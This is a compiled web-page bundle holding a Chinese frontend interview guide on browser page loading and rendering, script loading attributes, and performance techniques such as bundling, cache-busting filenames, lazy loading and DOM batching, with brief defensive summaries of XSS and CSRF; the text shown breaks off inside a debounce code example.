import{_ as n,c as s,o as a,a as t}from"./app-E4JImXTp.js";const e="/images/rewrite/guide-browser/render-pipeline.webp",p="/images/rewrite/guide-browser/response-html.webp",o="/images/rewrite/guide-browser/csrf-flow.webp",c={},l=t('<h1 id="一面-5-浏览器相关知识点与高频考题" tabindex="-1"><a class="header-anchor" href="#一面-5-浏览器相关知识点与高频考题"><span>一面 5：浏览器相关知识点与高频考题</span></a></h1><p>前端代码最终都要交给浏览器执行，所以面试官很喜欢从浏览器的角度出题。题目虽然五花八门，归纳起来基本落在三块：</p><ol><li><strong>页面是怎么加载、怎么渲染出来的</strong></li><li><strong>怎么让页面更快</strong>（性能优化）</li><li><strong>怎么让页面不被攻击</strong>（Web 安全）</li></ol><p>下面按这个顺序展开：先把「从地址栏到像素」的流程讲清楚，性能优化的大部分手段都能从这条流程里推出来；最后单独讲 XSS 和 CSRF 两种最常考的攻击。</p><h2 id="核心要点" tabindex="-1"><a class="header-anchor" href="#核心要点"><span>核心要点</span></a></h2><ul><li><strong>加载阶段</strong>：DNS 把域名解析成 IP → 和服务器建立连接 → 发 HTTP 请求 → 服务器处理后返回 → 浏览器拿到一段 HTML 文本。</li><li><strong>渲染阶段</strong>：HTML 解析成 DOM，CSS 解析成 CSSOM，两者合成渲染树，再经过布局、绘制、合成显示到屏幕上。</li><li><strong>普通 <code>&lt;script&gt;</code> 会卡住解析</strong>：JS 和渲染共用主线程，脚本又可能改 DOM，所以遇到它要先下载、执行完才继续。因此 CSS 放 <code>&lt;head&gt;</code>，JS 放 <code>&lt;/body&gt;</code> 前（或加 <code>defer</code>）。</li><li><strong>性能优化两条线</strong>：一是让资源更小、更少、更近（压缩合并、缓存、CDN），二是让渲染更省（减少 DOM 读写、懒加载、防抖节流、提前执行、SSR）。落地时要先测量、再优化、再复测，循环推进。</li><li><strong>XSS</strong>：攻击者把脚本混进页面让别人的浏览器执行，脚本拥有和页面一样的权限。防御靠输出转义、少用 <code>innerHTML</code>、<code>HttpOnly</code> Cookie、CSP。</li><li><strong>CSRF</strong>：攻击者诱导用户的浏览器带着已登录的 Cookie 去调用目标站接口。防御靠 CSRF Token、<code>SameSite</code> Cookie、校验来源、关键操作二次确认，写操作不要用 GET。</li><li>两者的区别：XSS 是<strong>在你的站点里执行了别人的代码</strong>；CSRF 是<strong>在别人的站点上冒用你的身份</strong>，攻击者自己看不到 Cookie。</li></ul><h2 id="一、从输入网址到页面出现" tabindex="-1"><a class="header-anchor" href="#一、从输入网址到页面出现"><span>一、从输入网址到页面出现</span></a></h2><blockquote><p>面试题：浏览器从加载页面到把它渲染出来，经历了哪些步骤？</p></blockquote><p>答这道题最好拆成两段：<strong>加载</strong>负责把 HTML 拿回来，<strong>渲染</strong>负责把文本变成画面。每段先列关键步骤，再挑重点稍作解释，不必一上来就深挖细节。</p><p><img src="'+e+'" alt="从输入 URL 到画面出现的两段流水线：加载阶段和渲染阶段"></p><h3 id="_1-加载-把-html-拿回来" tabindex="-1"><a class="header-anchor" href="#_1-加载-把-html-拿回来"><span>1. 加载：把 HTML 拿回来</span></a></h3><table><thead><tr><th>步骤</th><th>做了什么</th></tr></thead><tbody><tr><td>DNS 解析</td><td>浏览器拿着域名去查 DNS（依次命中浏览器缓存、系统缓存、本地 DNS 服务器……），得到服务器的 IP 地址</td></tr><tr><td>建立连接</td><td>和这个 IP 建立 TCP 连接；HTTPS 还要再做一次 TLS 握手</td></tr><tr><td>发送请求</td><td>向服务器发出 HTTP 请求，比如 <code>GET /orders</code></td></tr><tr><td>服务器处理</td><td>服务器根据请求做计算，比如查数据库、按当前用户拼出不同内容，然后把结果作为 HTTP 响应返回</td></tr><tr><td>接收响应</td><td>浏览器收到响应，主体就是 HTML</td></tr></tbody></table><p>举个具体例子：在地址栏输入 <code>https://shop.example/orders</code>，DNS 查到 <code>shop.example</code> 对应某个 IP，比如 <code>203.0.113.42</code>（同一个域名在不同时间、不同地区解析出的 IP 可能不一样，CDN 就是靠这一点把用户导到最近的节点）。浏览器向这个 IP 发请求，服务器查出当前用户的订单，把它们填进 HTML 后返回。</p><p>在开发者工具的 Network 面板里点开这个文档请求，切到 Response 标签，就能看到浏览器到底收到了什么：</p><p><img src="'+p+`" alt="开发者工具 Response 面板中看到的 HTML 文本（示意）"></p><p>可以看到，服务器回来的不是「页面」，只是一段 HTML 格式的文本。浏览器认的就是这种由 W3C / WHATWG 标准定义的格式，之后的渲染工作全靠它来解析。</p><blockquote><p>补充：加载阶段的更多细节，比如 DNS 的递归查询、TCP 三次握手、HTTP 缓存命中时可以直接跳过请求，都可以作为追问的展开点。完整链路推荐阅读 <a href="http://fex.baidu.com/blog/2014/05/what-happen/" target="_blank" rel="noopener noreferrer">从输入 URL 到页面加载完成的过程中都发生了什么事情？</a>。</p></blockquote><h3 id="_2-渲染-把文本变成画面" tabindex="-1"><a class="header-anchor" href="#_2-渲染-把文本变成画面"><span>2. 渲染：把文本变成画面</span></a></h3><p>关键步骤：</p><ol><li>解析 HTML，生成 <strong>DOM 树</strong>；</li><li>解析 CSS，生成 <strong>CSSOM</strong>；</li><li>把 DOM 和 CSSOM 合并成 <strong>渲染树</strong>（Render Tree），只保留需要显示的节点，并带上各自的计算样式；</li><li>根据渲染树做<strong>布局</strong>（算出每个盒子的位置和尺寸），再<strong>绘制</strong>、<strong>合成</strong>，最终显示到屏幕上；</li><li>解析过程中碰到 <code>&lt;script&gt;</code>，会停下来执行脚本，执行完再接着往下走。</li></ol><p>逐条说说为什么。</p><p><strong>为什么要先变成树？</strong> 浏览器收到的只是一长串字符，没法直接拿来计算位置、应用样式。先把它整理成有父子关系的结构（DOM 树），后续的样式匹配、布局计算、JS 操作才有对象可抓。树是最适合表达嵌套关系的数据结构。</p><p><strong>外部资源怎么拿？</strong> 解析中遇到 <code>&lt;link rel=&quot;stylesheet&quot; href=&quot;...&quot;&gt;</code>、<code>&lt;img src=&quot;...&quot;&gt;</code>、<code>&lt;script src=&quot;...&quot;&gt;</code> 这类引用，浏览器会为它们各自再发请求，过程和取 HTML 一样，只是回来的内容换成了 CSS、图片或 JS。现代浏览器还有一个「预加载扫描器」，会提前扫一遍后面的标签，把要下载的资源尽早发出去。</p><p><strong>为什么 CSS 要写在 <code>&lt;head&gt;</code> 里？</strong> 渲染树需要 DOM 和 CSSOM 都就绪。CSS 越早到手，CSSOM 就越早建好，DOM 解析完基本可以一次性得到正确样式的渲染树，首次绘制就是最终效果。如果把样式表放到 <code>&lt;body&gt;</code> 底部，浏览器可能先按默认样式把内容画出来，等样式到了再整体重新布局、重新绘制，用户会看到一闪而过的「裸页面」（FOUC），也多了一次渲染开销。</p><p><strong>为什么普通 <code>&lt;script&gt;</code> 会阻塞？</strong> 两个原因：</p><ul><li>JS 可以改 DOM（比如 <code>document.write</code>、插入删除节点），解析器不知道脚本会改什么，只能等它跑完再继续，否则解析结果可能作废；</li><li>JS 执行和 DOM 解析、样式计算、布局绘制都在<strong>同一条主线程</strong>上进行。之所以设计成单线程，是因为如果一边渲染、一边有另一个线程改 DOM，两边对同一棵树的修改就会打架。</li></ul><p>另外，脚本可能读取元素样式（如 <code>getComputedStyle</code>），所以如果它前面还有没下载完的 CSS，脚本执行也要等这份 CSS。</p><p><strong>为什么 JS 传统上放在 <code>&lt;/body&gt;</code> 之前？</strong></p><ul><li>先把已有的 HTML 解析、渲染出来，用户能更早看到内容，体验更好；</li><li>脚本里常常要操作页面元素。放在底部时，前面的 HTML 都已经变成 DOM，<code>document.getElementById</code> 一定找得到；放在 <code>&lt;head&gt;</code> 里时，<code>&lt;body&gt;</code> 还没解析，取元素会得到 <code>null</code>，接着调用方法就会报错。</li></ul><p>现在更常见的写法是把脚本留在 <code>&lt;head&gt;</code>，用属性控制时机：</p><table><thead><tr><th>写法</th><th>下载</th><th>执行时机</th><th>是否阻塞解析</th></tr></thead><tbody><tr><td><code>&lt;script src&gt;</code></td><td>立即，阻塞</td><td>下载完立刻执行</td><td>是</td></tr><tr><td><code>&lt;script src defer&gt;</code></td><td>并行</td><td>HTML 解析完、<code>DOMContentLoaded</code> 之前，按书写顺序</td><td>否</td></tr><tr><td><code>&lt;script src async&gt;</code></td><td>并行</td><td>下载完立刻执行，顺序不保证</td><td>只在执行那一刻暂停</td></tr><tr><td><code>&lt;script type=&quot;module&quot;&gt;</code></td><td>并行</td><td>默认行为同 <code>defer</code></td><td>否</td></tr></tbody></table><p>业务主脚本一般用 <code>defer</code>；统计、广告这类互不依赖、早执行晚执行都行的脚本用 <code>async</code>。</p><h2 id="二、性能优化" tabindex="-1"><a class="header-anchor" href="#二、性能优化"><span>二、性能优化</span></a></h2><blockquote><p>面试题：前端性能优化有哪些手段？</p></blockquote><p>这道题可以答得很浅，也可以一路追问到构建工具、网络协议、浏览器原理，很能看出一个人的视野和实际经验。回答时先给出原则和方向，再分点举例，最后说说在项目里是怎么推进的。</p><h3 id="_1-原则与方向" tabindex="-1"><a class="header-anchor" href="#_1-原则与方向"><span>1. 原则与方向</span></a></h3><p>衡量标准只有一个：<strong>用户感受到的体验更好</strong>。围绕这个标准，具体目标可以概括为两条：</p><ul><li><strong>用空间换时间</strong>：多利用内存、各级缓存，能复用的结果就别重新算、重新下载；</li><li><strong>让 CPU、GPU 少干活</strong>：减少计算量，让内容更快呈现出来。</li></ul><p>对应到前面的流程，手段自然分成两大方向：</p><table><thead><tr><th>方向</th><th>对应流程</th><th>手段</th></tr></thead><tbody><tr><td><strong>让加载更快</strong>：减小页面体积、减少请求</td><td>加载阶段</td><td>静态资源压缩与合并（JS、CSS 压缩合并，小图标合成雪碧图）；用文件指纹配合长缓存；静态资源放 CDN</td></tr><tr><td><strong>让渲染更省</strong></td><td>渲染阶段</td><td>CSS 在前、JS 在后；图片懒加载、滚动加载更多；缓存 DOM 查询结果；批量合并 DOM 修改（<code>DocumentFragment</code>）；高频事件做防抖 / 节流；在 <code>DOMContentLoaded</code> 时就开始干活，不等 <code>load</code>；服务端渲染（SSR），让数据直接出现在 HTML 里，省去浏览器端用 JS 拼模板的时间</td></tr></tbody></table><p>下面一项项看。</p><h3 id="_2-压缩与合并静态资源" tabindex="-1"><a class="header-anchor" href="#_2-压缩与合并静态资源"><span>2. 压缩与合并静态资源</span></a></h3><p>每个外部文件都要单独走一遍「请求 → 等待 → 下载」的过程。拆得越碎，花在往返上的时间越多：</p><div class="language-html line-numbers-mode" data-highlighter="prismjs" data-ext="html" data-title="html"><pre class="language-html"><code><span class="line"><span class="token comment">&lt;!-- 三个文件，三次请求 --&gt;</span></span>
<span class="line"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>/js/cart.js<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span></span>
<span class="line"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>/js/coupon.js<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span></span>
<span class="line"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>/js/checkout.js<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>打包工具把它们合成一个，只需要一次请求，同时去掉空格注释、缩短变量名，体积也变小：</p><div class="language-html line-numbers-mode" data-highlighter="prismjs" data-ext="html" data-title="html"><pre class="language-html"><code><span class="line"><span class="token comment">&lt;!-- 合并压缩之后 --&gt;</span></span>
<span class="line"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>/js/order-bundle.min.js<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><p>CSS 同理；多个小图标可以拼成一张雪碧图（CSS Sprites），用 <code>background-position</code> 取出需要的那块。服务器端再开启 gzip / Brotli 压缩，传输体积还能再降一大截。</p><blockquote><p>现代补充：HTTP/2 起一个连接可以并发传多个请求，「文件越少越好」不再绝对。现在的做法是按路由、按功能做代码分割，首屏只加载必需的部分；图标更多用 SVG 或图标字体，雪碧图用得越来越少。</p></blockquote><h3 id="_3-用文件名控制缓存" tabindex="-1"><a class="header-anchor" href="#_3-用文件名控制缓存"><span>3. 用文件名控制缓存</span></a></h3><p>静态资源可以让浏览器缓存很久，但前提是：<strong>内容变了，URL 也必须跟着变</strong>，否则用户会一直用旧文件。办法是把文件内容的哈希值写进文件名：</p><div class="language-html line-numbers-mode" data-highlighter="prismjs" data-ext="html" data-title="html"><pre class="language-html"><code><span class="line"><span class="token comment">&lt;!-- 第一次发布 --&gt;</span></span>
<span class="line"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>stylesheet<span class="token punctuation">&quot;</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>/assets/app.3f9c2e.css<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span></span>
<span class="line"><span class="token comment">&lt;!-- 改了样式重新构建，哈希随内容变化，浏览器会当作新文件去下载 --&gt;</span></span>
<span class="line"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>stylesheet<span class="token punctuation">&quot;</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>/assets/app.a71b05.css<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>内容没变，文件名就不变，缓存继续有效；内容一改，文件名随之变化，相当于自动「刷新」了缓存。这个哈希不用手写，webpack、Vite 等构建工具会根据文件内容自动生成（如 webpack 的 <code>[contenthash]</code>，早期常用 MD5 摘要）。配套的响应头一般是：</p><div class="language-http line-numbers-mode" data-highlighter="prismjs" data-ext="http" data-title="http"><pre class="language-http"><code><span class="line"><span class="token header"><span class="token header-name keyword">Cache-Control</span><span class="token punctuation">:</span> <span class="token header-value">max-age=31536000, immutable</span></span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>而引用这些文件的 HTML 本身不能长缓存（通常用 <code>no-cache</code> 每次协商），否则用户拿不到新的文件名。</p><h3 id="_4-静态资源放到-cdn" tabindex="-1"><a class="header-anchor" href="#_4-静态资源放到-cdn"><span>4. 静态资源放到 CDN</span></a></h3><p>CDN 在各地部署了节点，用户会被调度到离自己最近的节点去下载，链路更短、更稳定，节点上也有专门的缓存和传输优化。所以 JS、CSS、图片、字体这类静态文件应尽量走 CDN：</p><div class="language-html line-numbers-mode" data-highlighter="prismjs" data-ext="html" data-title="html"><pre class="language-html"><code><span class="line"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>https://cdn.jsdelivr.net/npm/dayjs@1.11.13/dayjs.min.js<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><blockquote><p>公共 CDN 适合开源库；公司自己的业务资源一般放到自有 CDN 域名下，方便控制缓存和权限。</p></blockquote><h3 id="_5-服务端渲染-ssr" tabindex="-1"><a class="header-anchor" href="#_5-服务端渲染-ssr"><span>5. 服务端渲染（SSR）</span></a></h3><p>纯前端渲染时，浏览器先拿到一个几乎空的 HTML，下载并执行 JS，再用 Ajax 请求数据，最后才把内容渲染出来。服务端渲染则在服务器上就把数据填进 HTML，一次请求返回完整内容，首屏能更快看到，也更利于搜索引擎收录。传统的模板引擎（如 PHP 的 Smarty、Java 的 JSP）是这种思路，现代框架里的 Vue SSR / Nuxt、React SSR / Next.js 也是。</p><h3 id="_6-css-在前、js-在后" tabindex="-1"><a class="header-anchor" href="#_6-css-在前、js-在后"><span>6. CSS 在前、JS 在后</span></a></h3><p>原因在第一部分已经分析过：CSS 早到能避免重绘和样式闪烁，JS 放后面（或加 <code>defer</code>）不阻塞解析。</p><h3 id="_7-懒加载" tabindex="-1"><a class="header-anchor" href="#_7-懒加载"><span>7. 懒加载</span></a></h3><p>页面上图片很多时，没必要一次全下载。先让所有图片的 <code>src</code> 指向一张很小的占位图（各个图片共用同一张，下载一次即可），把真实地址放在自定义属性里；等图片快滚动到可视区域时，再把真实地址换进 <code>src</code>：</p><div class="language-html line-numbers-mode" data-highlighter="prismjs" data-ext="html" data-title="html"><pre class="language-html"><code><span class="line"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>lazy<span class="token punctuation">&quot;</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>/img/placeholder.svg<span class="token punctuation">&quot;</span></span> <span class="token attr-name">data-src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>/photos/cat-1280.jpg<span class="token punctuation">&quot;</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>橘猫<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><div class="language-javascript line-numbers-mode" data-highlighter="prismjs" data-ext="js" data-title="js"><pre class="language-javascript"><code><span class="line"><span class="token keyword">const</span> observer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">IntersectionObserver</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">entries</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span></span>
<span class="line">  entries<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">entry</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span></span>
<span class="line">    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>entry<span class="token punctuation">.</span>isIntersecting<span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span></span>
<span class="line">    <span class="token keyword">const</span> pic <span class="token operator">=</span> entry<span class="token punctuation">.</span>target<span class="token punctuation">;</span></span>
<span class="line">    pic<span class="token punctuation">.</span>src <span class="token operator">=</span> pic<span class="token punctuation">.</span>dataset<span class="token punctuation">.</span>src<span class="token punctuation">;</span>   <span class="token comment">// 进入视口才换成真实地址</span></span>
<span class="line">    observer<span class="token punctuation">.</span><span class="token function">unobserve</span><span class="token punctuation">(</span>pic<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">// 换完就不用再盯着了</span></span>
<span class="line">  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line"><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> <span class="token literal-property property">rootMargin</span><span class="token operator">:</span> <span class="token string">&#39;200px&#39;</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">// 提前 200px 开始加载</span></span>
<span class="line"></span>
<span class="line">document<span class="token punctuation">.</span><span class="token function">querySelectorAll</span><span class="token punctuation">(</span><span class="token string">&#39;img.lazy&#39;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">pic</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> observer<span class="token punctuation">.</span><span class="token function">observe</span><span class="token punctuation">(</span>pic<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>「下拉加载更多」是同一个思路：列表先只渲染一页，滚到底部再请求下一页。</p><blockquote><p>现代补充：</p><ul><li>普通图片可以直接写 <code>&lt;img src=&quot;...&quot; loading=&quot;lazy&quot;&gt;</code>，浏览器原生支持懒加载，不需要任何脚本。</li><li>为什么自定义属性要以 <code>data-</code> 开头？这是 HTML 规范约定的写法：浏览器保证 <code>data-*</code> 属性不会和现在及将来的标准属性冲突，页面能通过校验，JS 里还能用 <code>element.dataset</code> 方便地读写。它和渲染性能没有关系，浏览器并不会因为属性名以 <code>data-</code> 开头就跳过它。</li></ul></blockquote><h3 id="_8-缓存-dom-查询结果" tabindex="-1"><a class="header-anchor" href="#_8-缓存-dom-查询结果"><span>8. 缓存 DOM 查询结果</span></a></h3><p>每查一次 DOM，都要跨越 JS 引擎和渲染引擎之间的边界，开销比访问普通变量大得多。对比下面两种写法：</p><div class="language-javascript line-numbers-mode" data-highlighter="prismjs" data-ext="js" data-title="js"><pre class="language-javascript"><code><span class="line"><span class="token comment">// 反例：每轮循环都重新查询一次 DOM</span></span>
<span class="line"><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> n <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> n <span class="token operator">&lt;</span> document<span class="token punctuation">.</span><span class="token function">querySelectorAll</span><span class="token punctuation">(</span><span class="token string">&#39;.card&#39;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>length<span class="token punctuation">;</span> n<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span>
<span class="line">  document<span class="token punctuation">.</span><span class="token function">querySelectorAll</span><span class="token punctuation">(</span><span class="token string">&#39;.card&#39;</span><span class="token punctuation">)</span><span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">.</span>dataset<span class="token punctuation">.</span>index <span class="token operator">=</span> n<span class="token punctuation">;</span></span>
<span class="line"><span class="token punctuation">}</span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-javascript line-numbers-mode" data-highlighter="prismjs" data-ext="js" data-title="js"><pre class="language-javascript"><code><span class="line"><span class="token comment">// 正例：只查一次，结果存进变量反复使用</span></span>
<span class="line"><span class="token keyword">const</span> cards <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelectorAll</span><span class="token punctuation">(</span><span class="token string">&#39;.card&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line"><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> n <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> n <span class="token operator">&lt;</span> cards<span class="token punctuation">.</span>length<span class="token punctuation">;</span> n<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span>
<span class="line">  cards<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">.</span>dataset<span class="token punctuation">.</span>index <span class="token operator">=</span> n<span class="token punctuation">;</span></span>
<span class="line"><span class="token punctuation">}</span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>记住一个原则：<strong>DOM 的读和写都很贵</strong>，能少一次是一次。</p><h3 id="_9-合并-dom-修改" tabindex="-1"><a class="header-anchor" href="#_9-合并-dom-修改"><span>9. 合并 DOM 修改</span></a></h3><p>每往页面里插一个节点，都可能触发一次重新布局。要插入一批节点时，先放进一个不在页面上的容器 <code>DocumentFragment</code>，全部准备好后一次性插入，页面只需要更新一次：</p><div class="language-javascript line-numbers-mode" data-highlighter="prismjs" data-ext="js" data-title="js"><pre class="language-javascript"><code><span class="line"><span class="token keyword">const</span> products <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">&#39;耳机&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;键盘&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;显示器&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;鼠标垫&#39;</span><span class="token punctuation">]</span><span class="token punctuation">;</span></span>
<span class="line"><span class="token keyword">const</span> cartList <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">&#39;cart&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line"></span>
<span class="line"><span class="token keyword">const</span> fragment <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createDocumentFragment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 游离在文档之外的轻量容器</span></span>
<span class="line"><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> name <span class="token keyword">of</span> products<span class="token punctuation">)</span> <span class="token punctuation">{</span></span>
<span class="line">  <span class="token keyword">const</span> item <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">&#39;li&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">  item<span class="token punctuation">.</span>textContent <span class="token operator">=</span> name<span class="token punctuation">;</span></span>
<span class="line">  fragment<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment">// 这里操作的是 fragment，页面不受影响</span></span>
<span class="line"><span class="token punctuation">}</span></span>
<span class="line">cartList<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>fragment<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">// 只在这一步真正改动页面</span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><blockquote><p>现代浏览器会把同一个任务里的多次修改攒起来再统一布局，所以只「写」不「读」的情况下差距没有想象中大。真正要警惕的是读写交替：写完样式紧接着读 <code>offsetHeight</code> 之类的布局属性，会逼浏览器立即重新布局。</p></blockquote><h3 id="_10-高频事件-防抖与节流" tabindex="-1"><a class="header-anchor" href="#_10-高频事件-防抖与节流"><span>10. 高频事件：防抖与节流</span></a></h3><p><code>input</code>、<code>keyup</code>、<code>scroll</code>、<code>resize</code> 这类事件触发得非常密集，如果每次都执行耗时逻辑（发请求、重新计算布局），页面会很卡。比如做搜索联想，只需要在用户停下输入时请求一次：</p><div class="language-javascript line-numbers-mode" data-highlighter="prismjs" data-ext="js" data-title="js"><pre class="language-javascript"><code><span class="line"><span class="token keyword">function</span> <span class="token function">debounce</span><span class="token punctuation">(</span><span class="token parameter">fn<span class="token punctuation">,</span> wait</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span>
<span class="line">  <span class="token keyword">let</span> timer <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span></span>
<span class="line">  <span class="token keyword">return</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter"><span class="token operator">...</span>args</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span>
<span class="line">    <span class="token function">clearTimeout</span><span class="token punctuation">(</span>timer<span class="token punctuation">)</span><span class="token punctuation">;</span>                              <span class="token comment">// 又触发了，前一次作废</span></span>
